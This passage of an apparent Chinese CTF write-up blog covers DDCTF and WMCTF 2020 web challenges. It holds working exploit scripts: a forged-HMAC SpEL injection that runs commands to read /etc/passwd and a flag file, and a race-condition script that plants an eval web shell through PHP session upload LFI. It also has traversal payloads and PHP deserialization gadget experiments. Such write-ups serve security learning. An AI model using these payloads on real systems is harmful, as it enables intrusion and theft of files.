class="line">&#123;&quot;signature&quot;:&quot;vwrEgR0HccLWvCB+FsgFevwkazZ5JmMECH8cDaBicuA&#x3D;&quot;,&quot;command&quot;:&quot;&#39;DDCTF&#39;&quot;,&quot;timestamp&quot;:1599306517&#125;HTTP&#x2F;1.1 200 </span><br><span class="line">Server: nginx&#x2F;1.14.0 (Ubuntu)</span><br><span class="line">Date: Sat, 05 Sep 2020 11:48:37 GMT</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">2d</span><br><span class="line">&#123;&quot;code&quot;:0,&quot;message&quot;:&quot;success&quot;,&quot;data&quot;:&quot;DDCTF&quot;&#125;</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>signature 伪造 from <a target="_blank" rel="noopener" href="https://docs.saltstack.com/en/latest/topics/jinja/index.html#hmac">saltstack_hmac</a></p>
<ul>
<li>paylaod</li>
</ul>
<p>比赛后问别的师傅,是 SPEL_SSTI  学习到了 <a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#%E5%AE%9E%E4%BE%8B%E4%B8%80%EF%BC%9A-1">ssti</a>  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;DDCTFWithYou&#x27;</span></span><br><span class="line">t = str(int(time.time())) <span class="comment">#time_stamp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read /etc/passwd </span></span><br><span class="line"><span class="comment">#command = &quot;&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())&#125;&quot;</span></span><br><span class="line"><span class="comment"># read /home/dc2-user/flag/flag.txt  command = &quot;&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(116))).getInputStream())&#125;&quot;</span></span><br><span class="line">command = <span class="string">&quot;&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(116))).getInputStream())&#125;&quot;</span></span><br><span class="line">message = <span class="string">&#x27;&#x27;&#x27;%s|%s&#x27;&#x27;&#x27;</span> %(command,t)</span><br><span class="line">h = hmac.new(key, bytes(message, encoding = <span class="string">&quot;utf8&quot;</span>), hashlib.sha256).digest()</span><br><span class="line">my_sign = base64.standard_b64encode(h)</span><br><span class="line">my_sign = str(my_sign, encoding = <span class="string">&quot;utf-8&quot;</span>) </span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27;&#123;&quot;signature&quot;:&quot;%s&quot;,&quot;command&quot;:&quot;%s&quot;,&quot;timestamp&quot;:%s&#125;&#x27;&#x27;&#x27;</span> %(my_sign,command,t)</span><br><span class="line"><span class="comment">#print(&quot;data: &quot;+data+&#x27;\n\r\n\r&#x27;)</span></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://117.51.136.197/server/command&#x27;</span>,data=data)</span><br><span class="line">print(res.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Overwrite-Me-暂时未复现"><a href="#Overwrite-Me-暂时未复现" class="headerlink" title="Overwrite Me [暂时未复现]"></a>Overwrite Me [暂时未复现]</h3><h2 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h2><h3 id="一起拼图吗"><a href="#一起拼图吗" class="headerlink" title="一起拼图吗"></a>一起拼图吗</h3><p>PS 拼图即可</p>
<p><img src="http://img.xzaslxr.xyz/img/image-20200906005257430.png" alt="image-20200906005257430"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDCTF&#123;484e61cd1483c34d08e4d76f9022d03b&#125;</span><br></pre></td></tr></table></figure>

<h1 id="WMCTF"><a href="#WMCTF" class="headerlink" title="WMCTF"></a>WMCTF</h1><h2 id="web-5"><a href="#web-5" class="headerlink" title="web"></a>web</h2><h3 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a><strong>web_checkin</strong></h3><blockquote>
<p>我一直以为要伪协议来绕过exit,见P神<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$sandbox = <span class="string">&#x27;D:/phpstudy_pro/WWW/test/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,$content))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($content))</span><br><span class="line">        <span class="keyword">require_once</span>($content);</span><br><span class="line">    file_put_contents($content,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但这题直接读就行。</p>
<p><img src="http://img.xzaslxr.xyz/img/image-20200801100818551.png" alt="image-20200801100818551"></p>
<h3 id="Make-PHP-Great-Again"><a href="#Make-PHP-Great-Again" class="headerlink" title="Make PHP Great Again"></a><strong>Make PHP Great Again</strong></h3><blockquote>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a> </p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201177#h3-6">LFI 绕过 Session 包含限制 Getshell</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201136#h3-6">PHP LFI 利用临时文件 Getshell 姿势</a></p>
<p>此题</p>
</blockquote>
<ul>
<li>apache2配置信息 <code>http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=/etc/apache2/apache2.conf</code></li>
<li><code>/proc/self/maps</code> 读取内存映射的相关信息</li>
</ul>
<p>但php.ini还是读不了,但可以根据2.0得到提示为<code>/tmp</code>文件夹下</p>
<p><img src="http://img.xzaslxr.xyz/img/image-20200802120506954.png" alt="image-20200802120506954"></p>
<blockquote>
<p>默认文件夹,如下:</p>
<p>/var/lib/php/sess_PHPSESSID </p>
<p>/var/lib/php/sessions/sess_PHPSESSID </p>
<p>/tmp/sess_PHPSESSID </p>
<p>/tmp/sessions/sess_PHPSESSID</p>
</blockquote>
<ul>
<li>payload</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;XZASFE1W0&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/index.php&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span>	</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=/tmp/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;test.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>

<ul>
<li>result</li>
</ul>
<p><img src="http://img.xzaslxr.xyz/img/image-20200802115339682.png" alt="image-20200802115339682"></p>
<h3 id="Make-PHP-Great-Again-2-0"><a href="#Make-PHP-Great-Again-2-0" class="headerlink" title="Make PHP Great Again 2.0"></a><strong>Make PHP Great Again 2.0</strong></h3><p>与1.0 的区别:</p>
<p><img src="http://img.xzaslxr.xyz/img/image-20200802120506954.png" alt="image-20200802120506954"></p>
<blockquote>
<p>1.0: <code>\#!/bin/bash if [[ -f /flag.sh ]]; then source /flag.sh fi apache2-foreground</code> </p>
</blockquote>
<ul>
<li>require_once 和  include_once 原理</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.laruence.com/2012/09/12/2765.html">再一次, 不要使用(include/require)_once</a></p>
</blockquote>
<ol>
<li>尝试解析文件的绝对路径, 如果能解析成功, 则检查EG(included_files), 存在则返回, 不存在继续</li>
<li>打开文件, 得到文件的打开路径(opened path)</li>
<li>拿opened path去EG(included_files)查找, 是否存在, 如果存在则返回, 不存在继续</li>
<li>编译文件(compile_file)</li>
</ol>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;x&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag</span><br></pre></td></tr></table></figure>

<p>比赛和复现过程中遇到的好文章:</p>
<p><a target="_blank" rel="noopener" href="https://www.slideshare.net/p8361/php-15004638">Security in PHP - 那些在滲透測試的小技巧</a></p>
<h3 id="webweb"><a href="#webweb" class="headerlink" title="webweb"></a><strong>webweb</strong></h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://fatfreeframework.com/3.7/getting-started">https://fatfreeframework.com/3.7/getting-started</a></p>
<p>这题是真滴累</p>
</blockquote>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Kickstart the framework</span></span><br><span class="line">$f3=<span class="keyword">require</span>(<span class="string">&#x27;lib/base.php&#x27;</span>);</span><br><span class="line">$f3-&gt;set(<span class="string">&#x27;DEBUG&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCRE_VERSION&lt;<span class="number">8.0</span>)</span><br><span class="line">	trigger_error(<span class="string">&#x27;PCRE version is out of date&#x27;</span>);</span><br><span class="line"><span class="comment">// Load configuration</span></span><br><span class="line">$f3-&gt;config(<span class="string">&#x27;config.ini&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set a route for get method </span></span><br><span class="line">$f3-&gt;route(<span class="string">&#x27;GET /&#x27;</span>,</span><br><span class="line">	<span class="function"><span class="keyword">function</span>(<span class="params">$f3</span>) </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;just get me a,don&#x27;t do anything else&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">);</span><br><span class="line">unserialize($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$f3-&gt;run();</span><br></pre></td></tr></table></figure>

<p><code>index.php</code>的执行顺序,如下:</p>
<ul>
<li><p>框架初始化和配置文件导入</p>
</li>
<li><p>设置一个get请求方式的路由器</p>
</li>
<li><p>反序列化 参数<code>a</code></p>
</li>
<li><p>f3执行</p>
</li>
</ul>
<p>ws.php</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc6455">websocket  RFC6455 手册</a></p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web">简介版</a></p>
</blockquote>
<p>从<code>index.php</code>的执行顺序来看,代码必定会加载<code>ws.php</code>来进行网络通信,在<code>WS</code>和<code>Agent</code>类中都有回调函数,其中<code>Agent</code>类中的<code>__destruct()</code>方法最好调用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server-&gt;events[<span class="string">&#x27;disconnect&#x27;</span>]) &amp;&amp;</span><br><span class="line">         is_callable($func=<span class="keyword">$this</span>-&gt;server-&gt;events[<span class="string">&#x27;disconnect&#x27;</span>]))</span><br><span class="line">         $func(<span class="keyword">$this</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$server,$socket,$verb,$uri,<span class="keyword">array</span> $hdrs</span>) </span>&#123;</span><br><span class="line">     <span class="keyword">$this</span>-&gt;server=$server;</span><br><span class="line">     <span class="keyword">$this</span>-&gt;id=stream_socket_get_name($socket,<span class="literal">TRUE</span>);</span><br><span class="line">     <span class="keyword">$this</span>-&gt;socket=$socket;</span><br><span class="line">     <span class="keyword">$this</span>-&gt;verb=$verb;</span><br><span class="line">     <span class="keyword">$this</span>-&gt;uri=$uri;</span><br><span class="line">     <span class="keyword">$this</span>-&gt;headers=$hdrs;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">isset</span>($server-&gt;events[<span class="string">&#x27;connect&#x27;</span>]) &amp;&amp;</span><br><span class="line">         is_callable($func=$server-&gt;events[<span class="string">&#x27;connect&#x27;</span>]))&#123;</span><br><span class="line">	$func(<span class="keyword">$this</span>);</span><br><span class="line">&#125;</span><br><span class="line">         </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>按道理来说<code>__construct</code>中的回调函数应该也可,但本地测试时,一直失败</p>
</blockquote>
<p>测试脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">cli</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;	</span><br><span class="line">        <span class="keyword">$this</span>=<span class="keyword">$this</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;agents = <span class="keyword">new</span> Agent(<span class="keyword">$this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">cli</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Agent</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$ws</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;server=$ws;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;events = <span class="keyword">array</span>(<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="string">&quot;var_dump&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (serialize(<span class="keyword">new</span> WS()));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">O:6:&quot;cli\WS&quot;:1:&#123;s:6:&quot;agents&quot;;O:9:&quot;cli\Agent&quot;:2:&#123;s:6:&quot;server&quot;;r:1;s:6:&quot;events&quot;;a:1:&#123;s:10:&quot;disconnect&quot;;s:8:&quot;var_dump&quot;;&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>但此处得到的payload无效,var_dump并不会执行</p>
</blockquote>
<p>php  对象引用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $AA;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;AA=<span class="keyword">new</span> B(<span class="keyword">$this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $BB;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$BB</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;BB=$BB;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($a).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">O:1:&quot;A&quot;:1:&#123;s:2:&quot;AA&quot;;O:1:&quot;B&quot;:1:&#123;s:2:&quot;BB&quot;;r:1;&#125;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>其中的<code>r</code>表示对象引用,而后的数字<code>r :&lt; number &gt;</code>,可以理解为序列化的层数</p>
<blockquote>
<p>见 <a target="_blank" rel="noopener" href="https://www.iteye.com/blog/lhx1026-477428">PHP 序列化（serialize）格式详解</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;cli\WS&quot;:1:&#123;s:6:&quot;agents&quot;;O:9:&quot;cli\Agent&quot;:2:&#123;s:6:&quot;server&quot;;r:1;s:6:&quot;events&quot;;a:1:&#123;s:10:&quot;disconnect&quot;;s:8:&quot;var_dump&quot;;&#125;&#125;&#125;</span><br><span class="line">#  r:1转为r:2 </span><br><span class="line">O:6:&quot;cli\WS&quot;:1:&#123;s:6:&quot;agents&quot;;O:9:&quot;cli\Agent&quot;:2:&#123;s:6:&quot;server&quot;;r:2;s:6:&quot;events&quot;;a:1:&#123;s:10:&quot;disconnect&quot;;s:8:&quot;var_dump&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>但不知为什么<code>r:1</code>转为<code>r:2 </code>, 即<code>$this-&gt;server=$this</code>   payload就可以用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">cli</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;	</span><br><span class="line">        <span class="keyword">$this</span>-&gt;agents = <span class="keyword">new</span> Agent(<span class="keyword">$this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">cli</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Agent</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;server=<span class="keyword">$this</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;events = <span class="keyword">array</span>(<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="string">&quot;var_dump&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (serialize(<span class="keyword">new</span> WS()));</span><br><span class="line"><span class="comment"># O:6:&quot;cli\WS&quot;:1:&#123;s:6:&quot;agents&quot;;O:9:&quot;cli\Agent&quot;:2:&#123;s:6:&quot;server&quot;;r:2;s:6:&quot;events&quot;;a:1:&#123;s:10:&quot;disconnect&quot;;s:8:&quot;var_dump&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>下一步: 使<code>$this-&gt;server=$this;</code>可控</p>
<p>利用<code>db\sql\mapper.php</code>中的<code>__call()</code>函数来 getshell</p>
<blockquote>
<p>原本想试试<code>db\sql.php</code>虽然<code>__call()</code>也可以控制,方法跟下面差不多,就是数组那个要写成<code>[对象|类,函数名]</code>的形式</p>
</blockquote>
